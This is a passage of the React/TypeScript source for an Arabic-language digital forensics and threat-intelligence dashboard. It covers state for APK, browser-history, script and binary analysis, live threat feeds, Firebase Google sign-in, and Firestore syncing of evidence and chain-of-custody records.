  const [apkAnalyzing, setApkAnalyzing] = useState<boolean>(false);
  const [apkStage, setApkStage] = useState<'idle' | 'extracting' | 'ai_evaluating' | 'done' | 'error'>('idle');
  const [isDraggingApk, setIsDraggingApk] = useState<boolean>(false);
  const [apkError, setApkError] = useState<string | null>(null);
  const [apkPermFilter, setApkPermFilter] = useState<'all' | 'sensitive'>('all');
  const [apkUrlFilter, setApkUrlFilter] = useState<'endpoints' | 'suspicious' | 'all'>('endpoints');
  const [apkStaticResult, setApkStaticResult] = useState<(ApkStaticForensicsResult & {
    sha256: string;
    sha1: string;
    sha512: string;
    md5: string;
    entropy: number;
    entropyClassification: string;
    headerHex: string;
  }) | null>(null);
  const [apkAiReport, setApkAiReport] = useState<{
    classification: string;
    isSpyware: boolean;
    riskLevel: string;
    threatScore: number;
    executiveSummary: string;
    spywareIndicators: string[];
    permissionsAssessment: { permission: string; risk: string; reason: string }[];
    networkAssessment: string;
    recommendations: string[];
    analyzedAt: string;
    modelUsed: string;
  } | null>(null);

  // Browser History & SQLite Artifact Extractor State
  const browserBufferRef = React.useRef<ArrayBuffer | null>(null);
  const [browserAnalyzing, setBrowserAnalyzing] = useState<boolean>(false);
  const [browserStage, setBrowserStage] = useState<'idle' | 'extracting' | 'ai_evaluating' | 'done' | 'error'>('idle');
  const [isDraggingBrowser, setIsDraggingBrowser] = useState<boolean>(false);
  const [browserError, setBrowserError] = useState<string | null>(null);
  const [browserViewTab, setBrowserViewTab] = useState<'urls' | 'visits' | 'downloads' | 'searches' | 'tables'>('urls');
  const [browserSearchQuery, setBrowserSearchQuery] = useState<string>('');
  const [browserOnlyFlagged, setBrowserOnlyFlagged] = useState<boolean>(false);
  const [browserStaticResult, setBrowserStaticResult] = useState<(SqliteBrowserForensicsResult & {
    sha256: string;
    sha1: string;
    sha512: string;
    md5: string;
    entropy: number;
    entropyClassification: string;
  }) | null>(null);
  const [browserAiReport, setBrowserAiReport] = useState<{
    behaviorClassification: string;
    hasSuspiciousActivity: boolean;
    riskLevel: string;
    threatScore: number;
    executiveSummary: string;
    suspiciousSites: {
      url: string;
      domain: string;
      visitDate: string;
      category: string;
      severity: string;
      reason: string;
    }[];
    behaviorPatterns: string[];
    recommendations: string[];
    analyzedAt: string;
    modelUsed: string;
  } | null>(null);

  // Directed Search (OSINT) State
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [searchResult, setSearchResult] = useState<{ result: string; sources: { title: string; uri: string }[]; internalResults?: Evidence[] } | null>(null);
  const [searchLoading, setSearchLoading] = useState<boolean>(false);

  // Global Threat Intelligence & Live OSINT Engine State
  const [threatIntelInput, setThreatIntelInput] = useState<string>('');
  const [threatIntelLoading, setThreatIntelLoading] = useState<boolean>(false);
  const [threatIntelError, setThreatIntelError] = useState<string | null>(null);
  const [threatIntelResult, setThreatIntelResult] = useState<{
    telemetry: any;
    intelligence: {
      verdict: string;
      isMalicious: boolean;
      riskLevel: string;
      threatScore: number;
      threatCategories: string[];
      executiveSummary: string;
      infrastructureAnalysis: string;
      osintFindings: string[];
      recommendations: string[];
    } | null;
    sources: { title: string; uri: string }[];
    groundedNarrative?: string;
    analyzedAt: string;
    modelUsed: string;
  } | null>(null);
  const [threatIntelHistory, setThreatIntelHistory] = useState<
    {
      indicator: string;
      indicatorType: string;
      country: string;
      asn: string;
      verdict: string;
      riskLevel: string;
      threatScore: number;
      isMalicious: boolean;
      analyzedAt: string;
      fullPayload: any;
    }[]
  >([]);

  // Malicious Script & Payload Deobfuscator State
  const scriptBufferRef = React.useRef<ArrayBuffer | null>(null);
  const [scriptAnalyzing, setScriptAnalyzing] = useState<boolean>(false);
  const [scriptStage, setScriptStage] = useState<'idle' | 'deobfuscating' | 'ai_evaluating' | 'done' | 'error'>('idle');
  const [isDraggingScript, setIsDraggingScript] = useState<boolean>(false);
  const [scriptInputText, setScriptInputText] = useState<string>('');
  const [scriptFileNameInput, setScriptFileNameInput] = useState<string>('suspicious_payload.ps1');
  const [scriptError, setScriptError] = useState<string | null>(null);
  const [scriptActiveSubTab, setScriptActiveSubTab] = useState<'layers' | 'commands' | 'network' | 'diff'>('layers');
  const [scriptStaticResult, setScriptStaticResult] = useState<(ScriptDeobfuscationResult & {
    sha256: string;
    sha1: string;
    sha512: string;
    md5: string;
    binaryEntropy: number;
    entropyClassification: string;
    headerHex: string;
  }) | null>(null);
  const [scriptAiReport, setScriptAiReport] = useState<{
    verdict: string;
    isMalicious: boolean;
    malwareFamilyOrType: string;
    riskLevel: string;
    threatScore: number;
    attackTechniques: string[];
    executiveSummary: string;
    behaviorBreakdown: string[];
    hiddenPayloadFindings: string[];
    recommendations: string[];
    analyzedAt: string;
    modelUsed: string;
  } | null>(null);

  // Binary, PE/ELF Headers & Deep Strings Forensic Lab State
  const binaryLabBufferRef = React.useRef<ArrayBuffer | null>(null);
  const [binaryLabAnalyzing, setBinaryLabAnalyzing] = useState<boolean>(false);
  const [binaryLabStage, setBinaryLabStage] = useState<'idle' | 'parsing' | 'ai_evaluating' | 'done' | 'error'>('idle');
  const [isDraggingBinaryLab, setIsDraggingBinaryLab] = useState<boolean>(false);
  const [binaryLabRawInput, setBinaryLabRawInput] = useState<string>('');
  const [binaryLabInputMode, setBinaryLabInputMode] = useState<'hex' | 'text'>('hex');
  const [binaryLabFileNameInput, setBinaryLabFileNameInput] = useState<string>('artifact_sample.exe');
  const [binaryLabError, setBinaryLabError] = useState<string | null>(null);
  const [binaryLabSubTab, setBinaryLabSubTab] = useState<'headers' | 'apis' | 'strings' | 'hex'>('headers');
  const [binaryLabStringSearch, setBinaryLabStringSearch] = useState<string>('');
  const [binaryLabStaticResult, setBinaryLabStaticResult] = useState<(BinaryDeepForensicsResult & {
    sha256: string;
    sha1: string;
    sha512: string;
    md5: string;
    headerHex: string;
  }) | null>(null);
  const [binaryLabAiReport, setBinaryLabAiReport] = useState<{
    verdict: string;
    isMalicious: boolean;
    threatClassification: string;
    riskLevel: string;
    threatScore: number;
    packerOrCompilerAnalysis: string;
    mitreTechniques: string[];
    executiveSummary: string;
    suspiciousFindings: string[];
    recommendations: string[];
    analyzedAt: string;
    modelUsed: string;
  } | null>(null);

  // Live Feeds & Automated Sync Engine States
  const DEFAULT_LIVE_FEED_IDS = ['cisa_kev', 'feodo_c2', 'circl_cve', 'cisa_advisories', 'sans_isc', 'hacker_news'];
  const [liveFeedsCatalog, setLiveFeedsCatalog] = useState<
    { id: string; name: string; provider: string; url: string; format: string; category: string; description: string }[]
  >(BUILTIN_THREAT_FEEDS_CLIENT);
  const [enabledLiveFeeds, setEnabledLiveFeeds] = useState<string[]>(() => {
    try {
      const saved = JSON.parse(localStorage.getItem('sovereign_enabled_live_feeds') || 'null');
      return Array.isArray(saved) && saved.length > 0 ? saved : DEFAULT_LIVE_FEED_IDS;
    } catch {
      return DEFAULT_LIVE_FEED_IDS;
    }
  });
  const [customLiveFeeds, setCustomLiveFeeds] = useState<{ name: string; url: string }[]>(() => {
    try {
      const saved = JSON.parse(localStorage.getItem('sovereign_custom_live_feeds') || '[]');
      return Array.isArray(saved) ? saved : [];
    } catch {
      return [];
    }
  });
  const [newCustomFeedName, setNewCustomFeedName] = useState<string>('');
  const [newCustomFeedUrl, setNewCustomFeedUrl] = useState<string>('');
  const [liveFeedsAutoSync, setLiveFeedsAutoSync] = useState<boolean>(() => {
    const saved = localStorage.getItem('sovereign_live_feeds_autosync');
    return saved === null ? true : saved === 'true';
  });
  const [liveFeedsIntervalSec, setLiveFeedsIntervalSec] = useState<number>(() => {
    const saved = Number(localStorage.getItem('sovereign_live_feeds_interval') || '300');
    return [30, 60, 300, 900, 1800].includes(saved) ? saved : 300;
  });
  const [liveFeedsAutoEscalate, setLiveFeedsAutoEscalate] = useState<boolean>(true);
  const [liveFeedsCountdownSec, setLiveFeedsCountdownSec] = useState<number>(300);
  const [liveFeedsSyncing, setLiveFeedsSyncing] = useState<boolean>(false);
  const [liveFeedsError, setLiveFeedsError] = useState<string | null>(null);
  const [liveFeedsResult, setLiveFeedsResult] = useState<{
    items: {
      id: string;
      sourceId: string;
      sourceName: string;
      category: string;
      title: string;
      indicator: string;
      indicatorKind: string;
      severity: 'critical' | 'high' | 'medium' | 'low';
      severityAr: string;
      cvssScore?: number;
      publishedAt: string;
      summary: string;
      link: string;
      tags: string[];
    }[];
    sourceStatuses: {
      id: string;
      name: string;
      provider: string;
      url: string;
      format: string;
      category: string;
      status: 'ok' | 'error';
      itemCount: number;
      latencyMs: number;
      fetchedAt: string;
      error?: string;
    }[];
    stats: {
      totalItems: number;
      criticalCount: number;
      highCount: number;
      cveCount: number;
      c2Count: number;
      advisoryCount: number;
      activeSourcesOk: number;
      activeSourcesTotal: number;
    };
    syncedAt: string;
  } | null>(null);
  const [liveFeedsCategoryFilter, setLiveFeedsCategoryFilter] = useState<string>('ALL');
  const [liveFeedsSeverityFilter, setLiveFeedsSeverityFilter] = useState<string>('ALL');
  const [liveFeedsSearchQuery, setLiveFeedsSearchQuery] = useState<string>('');
  const [liveFeedsBriefingLoading, setLiveFeedsBriefingLoading] = useState<boolean>(false);
  const [liveFeedsBriefing, setLiveFeedsBriefing] = useState<{
    alertCondition: string;
    executiveBriefing: string;
    topPriorityThreats: string[];
    affectedTechnologies: string[];
    actionablePlaybook: string[];
    generatedAt: string;
    modelUsed: string;
  } | null>(null);
  const ingestedLiveFeedIdsRef = React.useRef<Set<string>>(
    (() => {
      try {
        const arr = JSON.parse(localStorage.getItem('sovereign_ingested_live_feed_ids') || '[]');
        return new Set<string>(Array.isArray(arr) ? arr : []);
      } catch {
        return new Set<string>();
      }
    })()
  );

  // Dynamic Layout & UI Customizer States (Auto-saved in LocalStorage + Firebase)
  const [uiPrefs, setUiPrefs] = useState<UiPreferences>(() => {
    try {
      const raw = localStorage.getItem('sovereign_ui_preferences');
      if (raw) {
        const parsed = JSON.parse(raw);
        return {
          ...DEFAULT_UI_PREFERENCES,
          ...parsed,
          multiGridPanels:
            Array.isArray(parsed?.multiGridPanels) && parsed.multiGridPanels.length > 0
              ? parsed.multiGridPanels
              : DEFAULT_UI_PREFERENCES.multiGridPanels,
        };
      }
    } catch {}
    return DEFAULT_UI_PREFERENCES;
  });
  const [showLayoutCustomizer, setShowLayoutCustomizer] = useState<boolean>(false);
  const [showExportModal, setShowExportModal] = useState<boolean>(false);
  const [uiSyncStatus, setUiSyncStatus] = useState<'idle' | 'saving' | 'saved' | 'local-only'>('idle');
  const [mobileSidebarOpen, setMobileSidebarOpen] = useState<boolean>(false);
  const [sidebarSearch, setSidebarSearch] = useState<string>('');
  const uiPrefsRef = React.useRef<UiPreferences>(uiPrefs);
  useEffect(() => {
    uiPrefsRef.current = uiPrefs;
  }, [uiPrefs]);

  // Apply Theme (curated or 540+ procedural), Layout Structure, Font Scale & UI Density immediately to DOM
  useEffect(() => {
    const root = document.documentElement;
    root.dataset.sovereignTheme = uiPrefs.themePreset;
    root.dataset.sovereignLayout = uiPrefs.layoutStructure;
    root.dataset.sovereignDensity = uiPrefs.density;
    root.style.fontSize = uiPrefs.fontScale === 'sm' ? '14px' : uiPrefs.fontScale === 'lg' ? '18px' : '16px';

    if (uiPrefs.themePreset === 'procedural') {
      const procTheme =
        getProceduralThemeById(uiPrefs.proceduralThemeId) ||
        getProceduralThemeById('proc-001') ||
        null;
      applyProceduralThemeVariablesToRoot(procTheme);
    } else {
      applyProceduralThemeVariablesToRoot(null);
    }
  }, [
    uiPrefs.themePreset,
    uiPrefs.proceduralThemeId,
    uiPrefs.layoutStructure,
    uiPrefs.density,
    uiPrefs.fontScale,
  ]);

  const persistUiPreferencesToCloud = async (nextPrefs: UiPreferences) => {
    const activeUser = auth.currentUser;
    if (!activeUser) {
      setUiSyncStatus('local-only');
      return;
    }
    setUiSyncStatus('saving');
    try {
      const profileRef = doc(db, 'users', activeUser.uid);
      const existingSnap = await getDoc(profileRef);
      const existingSettings = existingSnap.exists() ? (existingSnap.data()?.settings || {}) : {};
      const updatedSettings = {
        ...existingSettings,
        uiPreferences: nextPrefs,
      };
      if (existingSnap.exists()) {
        await updateDoc(profileRef, { settings: updatedSettings });
      } else {
        await setDoc(profileRef, {
          uid: activeUser.uid,
          email: activeUser.email || '',
          displayName: activeUser.displayName || 'محقق سيادي',
          role: 'analyst',
          createdAt: new Date().toISOString(),
          settings: updatedSettings,
        });
      }
      setUserProfile((prev) => (prev ? { ...prev, settings: updatedSettings } : prev));
      setUiSyncStatus('saved');
    } catch (err) {
      console.error('Failed to sync UI preferences to Firestore:', err);
      setUiSyncStatus('local-only');
      try {
        handleFirestoreError(err, OperationType.UPDATE, `users/${activeUser.uid}`);
      } catch {
        // Error already logged cleanly
      }
    }
  };

  const updateUiPreferences = (patch: Partial<UiPreferences>) => {
    const nextPrefs: UiPreferences = {
      ...uiPrefsRef.current,
      ...patch,
      updatedAt: new Date().toISOString(),
    };
    setUiPrefs(nextPrefs);
    try {
      localStorage.setItem('sovereign_ui_preferences', JSON.stringify(nextPrefs));
    } catch {}
    void persistUiPreferencesToCloud(nextPrefs);
  };

  const resetUiPreferences = () => {
    const resetPrefs: UiPreferences = {
      ...DEFAULT_UI_PREFERENCES,
      updatedAt: new Date().toISOString(),
    };
    updateUiPreferences(resetPrefs);
    notifyStatus('تمت استعادة الإعدادات الافتراضية للهيكل والواجهة.', 'success');
  };

  const handleSelectTab = (tab: AppTabId) => {
    setActiveTab(tab);
    setMobileSidebarOpen(false);
    if (uiPrefs.layoutStructure === 'multi_grid' && !uiPrefs.multiGridPanels.includes(tab)) {
      updateUiPreferences({
        multiGridPanels: [tab, ...uiPrefs.multiGridPanels].slice(0, 6),
      });
    }
  };

  const isTabVisible = (tab: AppTabId): boolean => {
    if (uiPrefs.layoutStructure === 'multi_grid') {
      return uiPrefs.multiGridPanels.includes(tab);
    }
    return activeTab === tab;
  };

  // Health Check State
  const [healthStatus, setHealthStatus] = useState<{
    auth: 'pass' | 'fail' | 'pending';
    firestore: 'pass' | 'fail' | 'pending';
    storage: 'pass' | 'fail' | 'pending';
    lastRun?: string;
  }>({ auth: 'pending', firestore: 'pending', storage: 'pending' });
  const [isTestingHealth, setIsTestingHealth] = useState(false);

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, async (u) => {
      const isGoogleUser = Boolean(
        u &&
        !u.isAnonymous &&
        u.providerData?.some((provider) => provider.providerId === 'google.com')
      );

      if (u && !isGoogleUser) {
        console.warn('[Sovereign Auth] Non-Google session detected; enforcing Google Sign-In only.');
        try {
          await signOut(auth);
        } catch {}
        setIsCloudAuthenticated(false);
        setUser(null);
        setUserProfile(null);
        setAuthError('يجب تسجيل الدخول باستخدام حساب Google فقط عبر Firebase Authentication.');
        setAuthReady(true);
        return;
      }

      if (u && isGoogleUser) {
        const googleEmail =
          u.email ||
          u.providerData?.find((provider) => provider.providerId === 'google.com')?.email ||
          '';
        setUser(u);
        setIsCloudAuthenticated(true);
        try {
          // Fetch or Create User Profile
          const profileRef = doc(db, 'users', u.uid);
          const profileSnap = await getDoc(profileRef);
          
          if (!profileSnap.exists()) {
            const newProfile: UserProfile = {
              uid: u.uid,
              email: googleEmail.slice(0, 320),
              displayName: (u.displayName || 'محقق جديد').slice(0, 128),
              photoURL: (u.photoURL || '').slice(0, 2048),
              role: 'analyst',
              createdAt: new Date().toISOString().slice(0, 64),
              settings: {
                uiPreferences: uiPrefsRef.current,
              },
            };
            await setDoc(profileRef, newProfile);
            setUserProfile(newProfile);
            setUiSyncStatus('saved');
          } else {
            const loadedProfile = profileSnap.data() as UserProfile;
            setUserProfile(loadedProfile);
            const cloudUi = loadedProfile?.settings?.uiPreferences as Partial<UiPreferences> | undefined;
            if (cloudUi && cloudUi.layoutStructure) {
              const mergedPrefs: UiPreferences = {
                ...DEFAULT_UI_PREFERENCES,
                ...cloudUi,
                multiGridPanels:
                  Array.isArray(cloudUi.multiGridPanels) && cloudUi.multiGridPanels.length > 0
                    ? cloudUi.multiGridPanels
                    : DEFAULT_UI_PREFERENCES.multiGridPanels,
              };
              setUiPrefs(mergedPrefs);
              try {
                localStorage.setItem('sovereign_ui_preferences', JSON.stringify(mergedPrefs));
              } catch {}
              setUiSyncStatus('saved');
            } else {
              // Seed cloud settings with current local preferences
              void persistUiPreferencesToCloud(uiPrefsRef.current);
            }
          }
        } catch (err) {
          console.error('Error initializing cloud user profile:', err);
        }
      } else {
        setIsCloudAuthenticated(false);
        setUser(null);
        setUserProfile(null);
      }
      setAuthReady(true);
    });

    // Battery API
    if ('getBattery' in navigator) {
      (navigator as any).getBattery().then((battery: any) => {
        setBatteryInfo({
          level: Math.round(battery.level * 100),
          charging: battery.charging
        });
        battery.addEventListener('levelchange', () => {
          setBatteryInfo(prev => ({ ...prev, level: Math.round(battery.level * 100) }));
        });
        battery.addEventListener('chargingchange', () => {
          setBatteryInfo(prev => ({ ...prev, charging: battery.charging }));
        });
      });
    }

    const updateNetworkStatus = () => {
      setNetworkInfo({
        online: navigator.onLine,
        type: (navigator as any).connection?.effectiveType || '4g',
        downlink: (navigator as any).connection?.downlink ? `${(navigator as any).connection.downlink} Mbps` : 'سريع'
      });
    };

    window.addEventListener('online', updateNetworkStatus);
    window.addEventListener('offline', updateNetworkStatus);
    const conn = (navigator as any).connection;
    if (conn) {
      conn.addEventListener('change', updateNetworkStatus);
    }

    return () => {
      unsubscribe();
      window.removeEventListener('online', updateNetworkStatus);
      window.removeEventListener('offline', updateNetworkStatus);
      if (conn) {
        conn.removeEventListener('change', updateNetworkStatus);
      }
    };
  }, []);

  // Real-time Firestore onSnapshot Listeners for Investigations, Evidence, and Audit Logs
  useEffect(() => {
    const activeUser = auth.currentUser;
    if (!isCloudAuthenticated || !activeUser) return;

    const uid = activeUser.uid;
    setEvidenceLoading(true);

    const unsubInvestigations = onSnapshot(
      query(collection(db, 'investigations'), where('userId', '==', uid)),
      (invSnapshot) => {
        const invList: Investigation[] = [];
        invSnapshot.forEach(docSnap => {
          const data = docSnap.data();
          invList.push({
            id: docSnap.id,
            title: data.title,
            caseNumber: data.caseNumber,
            description: data.description,
            status: data.status || 'active',
            createdAt: data.createdAt
          });
        });
        invList.sort((a, b) => getTimeMsSafe(b.createdAt) - getTimeMsSafe(a.createdAt));
        setInvestigations(invList);
        try {
          localStorage.setItem('sovereign_investigations_local', JSON.stringify(invList));
        } catch (_) {}
        if (invList.length > 0) {
          setCurrentInvestigationId(prev => prev && invList.some(i => i.id === prev) ? prev : invList[0].id);
        } else {
          setCurrentInvestigationId(null);
        }
      },
      (error) => {
        console.error('Investigations snapshot error:', error);
        handleFirestoreError(error, OperationType.LIST, 'investigations');
      }
    );

    const unsubEvidence = onSnapshot(
      query(collection(db, 'evidence'), where('userId', '==', uid)),
      (evSnapshot) => {
        const list: Evidence[] = [];
        evSnapshot.forEach(docSnap => {
          const data = docSnap.data();
          list.push({ id: docSnap.id, ...data } as Evidence);
        });
        list.sort((a, b) => getTimeMsSafe(b.createdAt) - getTimeMsSafe(a.createdAt));
        setEvidenceList(list);
        try {
          localStorage.setItem('sovereign_evidence_local', JSON.stringify(list.slice(0, 40)));
        } catch (_) {}
        setEvidenceLoading(false);
      },
      (error) => {
        setEvidenceLoading(false);
        console.error('Evidence snapshot error:', error);
        handleFirestoreError(error, OperationType.LIST, 'evidence');
      }
    );

    const unsubAuditLogs = onSnapshot(
      query(collection(db, 'audit_logs'), where('userId', '==', uid), limit(100)),
      (auditSnapshot) => {
        const cloudLogs: AuditLogEntry[] = [];
        auditSnapshot.forEach(docSnap => {
          const data = docSnap.data();
          cloudLogs.push({
            id: data.id || docSnap.id,
            timestamp: data.createdAt || new Date().toISOString(),
            fileName: data.fileName || 'عملية جنائية',
            fileSize: typeof data.fileSize === 'number' ? formatFileSize(data.fileSize) : data.fileSize || 'N/A',
            verdict: data.summary || 'تم الفحص بنجاح',
            score: data.authenticityScore ?? 0,
            risk: (data.aiConfidence ?? 0) > 70 ? 'حرج' : (data.aiConfidence ?? 0) > 40 ? 'متوسط' : 'منخفض',
            sha256: data.sha256 || 'N/A',
            investigationId: data.investigationId,
            synced: true
          });
        });
        const dedupedLogs = dedupeAuditLogs(cloudLogs);
        auditLogsRef.current = dedupedLogs;
        setAuditLogs(dedupedLogs);
        try {
          localStorage.setItem('siyadi_audit_logs', JSON.stringify(dedupedLogs.slice(0, 100)));
        } catch (_) {}
      },
      (error) => {
        console.error('Audit logs snapshot error:', error);
        handleFirestoreError(error, OperationType.LIST, 'audit_logs');
      }
    );

    const unsubCustodyLedger = onSnapshot(
      query(collection(db, 'custody_ledger'), where('userId', '==', uid), limit(150)),
      (ledgerSnapshot) => {
        const blocks: ChainOfCustodyEntry[] = [];
        ledgerSnapshot.forEach(docSnap => {
          blocks.push({ id: docSnap.id, ...docSnap.data(), synced: true } as ChainOfCustodyEntry);
        });
        blocks.sort((a, b) => getTimeMsSafe(b.timestamp) - getTimeMsSafe(a.timestamp));
        if (blocks.length > 0 && blocks[0].recordHash && blocks[0].recordHash.length === 64) {
          latestLedgerHashRef.current = blocks[0].recordHash;
        }
        setGlobalCustodyLedger(blocks);
        try {
          localStorage.setItem('sovereign_global_custody_ledger', JSON.stringify(blocks.slice(0, 150)));
        } catch (_) {}
      },
      (error) => {
        console.error('Custody ledger snapshot error:', error);
        handleFirestoreError(error, OperationType.LIST, 'custody_ledger');
      }
    );

    const unsubReports = onSnapshot(
      query(collection(db, 'forensic_reports'), where('userId', '==', uid), limit(50)),
      (repSnapshot) => {
        const list: SavedForensicReport[] = [];
        repSnapshot.forEach(docSnap => {
          list.push({ id: docSnap.id, ...docSnap.data(), synced: true } as SavedForensicReport);
        });
        list.sort((a, b) => getTimeMsSafe(b.createdAt) - getTimeMsSafe(a.createdAt));
        setSavedReports(list);
        try {
          localStorage.setItem('sovereign_forensic_reports', JSON.stringify(list.slice(0, 50)));
        } catch (_) {}
      },
      (error) => {
        console.error('Forensic reports snapshot error:', error);
        handleFirestoreError(error, OperationType.LIST, 'forensic_reports');
      }
    );

    return () => {
      unsubInvestigations();
      unsubEvidence();
      unsubAuditLogs();
      unsubCustodyLedger();
      unsubReports();
    };
  }, [isCloudAuthenticated, user?.uid]);

  // Keep Dashboard Stats Synchronized Reactively
  useEffect(() => {
    const evidenceThreats = evidenceList.filter(
      (e) => (e.analysis?.authenticityScore ?? 100) < 50 || e.analysis?.riskLevel === 'حرج' || e.analysis?.riskLevel === 'مرتفع'
    ).length;
    const feedThreats = liveFeedsResult?.items?.filter(
      (item: any) => item.severity === 'critical' || item.severity === 'high'
    ).length || 0;
    const intelThreats = threatIntelHistory.filter(
      (h) => h.isMalicious || h.riskLevel === 'حرج' || h.riskLevel === 'مرتفع'
    ).length;

    const totalRealThreats = evidenceThreats + feedThreats + intelThreats;

    const freshStats: DashboardStats = {
      totalInvestigations: investigations.length,
      totalEvidence: evidenceList.length,
      totalLogs: auditLogs.length,
      detectedThreats: totalRealThreats,
      lastUpdated: new Date().toISOString(),
    };

    setDashboardStats(freshStats);
    try {
      localStorage.setItem('sovereign_dashboard_stats', JSON.stringify(freshStats));
    } catch (_) {}
  }, [investigations.length, evidenceList, auditLogs.length, liveFeedsResult, threatIntelHistory.length]);

  // Live Firestore Listener for Selected Evidence Chain of Custody
  useEffect(() => {
    const activeUser = auth.currentUser;
    if (!isCloudAuthenticated || !activeUser || !selectedEvidenceForHistory) return;

    let cancelled = false;
    let unsubCustody: (() => void) | null = null;

    const attachCustodyListener = async () => {
      try {
        const parentSnap = await getDoc(doc(db, 'evidence', selectedEvidenceForHistory));
        if (cancelled || !parentSnap.exists()) return;

        const q = query(
          collection(db, 'evidence', selectedEvidenceForHistory, 'chain_of_custody'),
          orderBy('timestamp', 'desc')
        );
        unsubCustody = onSnapshot(
          q,
          (snap) => {
            const cloudEntries: ChainOfCustodyEntry[] = [];
            snap.forEach(docSnap => {
              cloudEntries.push({ id: docSnap.id, ...docSnap.data() } as ChainOfCustodyEntry);
            });
            if (cloudEntries.length > 0) {
              cloudEntries.sort((a, b) => getTimeMsSafe(b.timestamp) - getTimeMsSafe(a.timestamp));
              setCustodyHistory(cloudEntries);
              try {
                localStorage.setItem(`sovereign_custody_${selectedEvidenceForHistory}`, JSON.stringify(cloudEntries));
              } catch (_) {}
            }
          },
          (error) => {
            console.error('Chain of custody snapshot error:', error);
            handleFirestoreError(error, OperationType.LIST, `evidence/${selectedEvidenceForHistory}/chain_of_custody`);
          }
        );
      } catch (err) {
        console.warn('Custody parent check skipped:', err);
      }
    };

    attachCustodyListener();

    return () => {
      cancelled = true;
      if (unsubCustody) unsubCustody();
    };
  }, [isCloudAuthenticated, user?.uid, selectedEvidenceForHistory]);

  // Real async SHA-256 verification whenever custodyHistory or globalCustodyLedger changes
  useEffect(() => {
    let cancelled = false;
    verifyCustodyChainAsync(custodyHistory).then((result) => {
      if (!cancelled) {
        setCustodyVerification(result);
      }
    });
    return () => {
      cancelled = true;
    };
  }, [custodyHistory]);

  useEffect(() => {
    let cancelled = false;
    verifyCustodyChainAsync(globalCustodyLedger).then((result) => {
      if (!cancelled) {
        setGlobalLedgerVerification(result);
      }
    });
    return () => {
      cancelled = true;
    };
  }, [globalCustodyLedger]);

  const formatAuthError = (err: any, fallback: string) => {
    const code = err?.code || '';
    const msg = err?.message || '';
    if (code === 'auth/unauthorized-domain') return `نطاق التطبيق الحالي (${window.location.hostname}) غير مضاف إلى النطاقات المصرح بها في مشروع Firebase (${firebaseConfig.projectId}). تأكد من إضافة ${PRIMARY_VERCEL_DOMAIN} في Firebase Console.`;
    if (code === 'auth/popup-blocked') return 'المتصفح منع فتح نافذة تسجيل الدخول. يرجى السماح بالنوافذ المنبثقة (Popups).';
    if (code === 'auth/popup-closed-by-user') return 'تم إغلاق نافذة تسجيل الدخول قبل إتمام العملية.';
    if (code === 'auth/cancelled-popup-request') return 'تم إلغاء طلب نافذة تسجيل الدخول بسبب فتح نافذة أخرى.';
    if (code === 'auth/account-exists-with-different-credential') return 'هذا البريد مرتبط بطريقة دخول أخرى.';
    if (code === 'auth/operation-not-allowed') return 'مزود تسجيل الدخول عبر Google غير مفعل حالياً في إعدادات Firebase.';
    if (code === 'auth/network-request-failed') return 'تعذر الاتصال بخوادم المصادقة. تحقق من اتصال الإنترنت.';
    return msg || fallback;
  };

  const handleGoogleLogin = async () => {
    setAuthLoading(true);
    setAuthError(null);
    if (domainVerification.isLegacyVercelDomain && typeof window !== 'undefined') {
      window.location.replace(domainVerification.canonicalUrl);
      return;
    }
    try {
      const provider = createGoogleAuthProvider();
      await signInWithPopup(auth, provider);
    } catch (err: any) {
      console.error('[Sovereign Auth] Google Sign-In Error:', {
        code: err?.code,
        message: err?.message,
        hostname: domainVerification.hostname,
        projectId: firebaseConfig.projectId,
      });
      const specificMsg = formatAuthError(err, err?.message || 'فشل المصادقة عبر Google.');
      setAuthError(`خطأ المصادقة [${err?.code || 'AUTH_ERROR'}]: ${specificMsg}`);
    } finally {
      setAuthLoading(false);
    }
  };

  const handleSignOut = async () => {
    try {
      await signOut(auth);
      setIsCloudAuthenticated(false);
      setActiveTab('dashboard');
      notifyStatus('تم تسجيل الخروج من السحابة.', 'warning');
    } catch (err) {
      console.error('Sign Out Error:', err);
    }
  };

  const updateProfileData = async (data: Partial<UserProfile>) => {
    if (!user || !userProfile) return;
    // Strip immutable server-controlled fields to enforce defense-in-depth on profile updates
    const { role: _ignoredRole, uid: _ignoredUid, createdAt: _ignoredCreated, ...safeData } = data as Record<string, any>;
    if (!auth.currentUser) {
      setUserProfile({ ...userProfile, ...safeData });
      return;
    }
    try {
      const profileRef = doc(db, 'users', auth.currentUser.uid);
      await updateDoc(profileRef, safeData);
      setUserProfile({ ...userProfile, ...safeData });
      if (safeData.displayName) await updateProfile(auth.currentUser, { displayName: String(safeData.displayName).slice(0, 128) });
      const changedFields = Object.keys(safeData).join(', ');
      await recordCustodyLedgerBlock(
        `settings-${auth.currentUser.uid}`,
        'SETTINGS_CHANGE',
        `تعديل إعدادات الملف الشخصي (${changedFields})`,
        'لوحة إدارة الحساب والإعدادات',
        safeData.displayName ? `تحديث الاسم المعروض إلى: ${safeData.displayName}` : 'تحديث بيانات وإعدادات الحساب في Firestore'
      );
      notifyStatus('تم تحديث الملف الشخصي وتوثيق التعديل في سلسلة الحفظ على Firestore.', 'success');
    } catch (err) {
      console.error('Update profile error:', err);
    }
  };

  const handleChangePassword = async () => {
    if (!user?.email || !auth.currentUser) {
      notifyStatus('يرجى تسجيل الدخول بحساب فعلي أولاً.', 'warning');
      return;
    }
    try {
      await sendPasswordResetEmail(auth, user.email);
      notifyStatus('تم إرسال رابط إعادة تعيين كلمة المرور إلى بريدك الإلكتروني.', 'success');
    } catch (err: any) {
      notifyStatus('خطأ في إرسال طلب تغيير كلمة المرور: ' + err.message, 'error');
    }
  };

  const handleProfilePhotoUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file || !auth.currentUser) {
      if (!auth.currentUser) notifyStatus('المصادقة السحابية مطلوبة لرفع الصورة إلى التخزين السحابي.', 'warning');
      return;
    }

    if (!file.type || !file.type.startsWith('image/')) {
      notifyStatus('يُسمح فقط برفع ملفات الصور الصالحة للملف الشخصي.', 'error');
      return;
    }
    if (file.size > 5 * 1024 * 1024) {
      notifyStatus('حجم الصورة يتجاوز الحد الأقصى المسموح به (5 MB).', 'error');
      return;
    }

    try {
      const storagePath = `profiles/${auth.currentUser.uid}/avatar_${Date.now()}`;
      const fileRef = ref(storage, storagePath);
      const metadata = { contentType: file.type };
      
      await uploadBytes(fileRef, file, metadata);
      const url = await getDownloadURL(fileRef);
      
      await updateProfileData({ photoURL: url });
      await updateProfile(auth.currentUser, { photoURL: url });
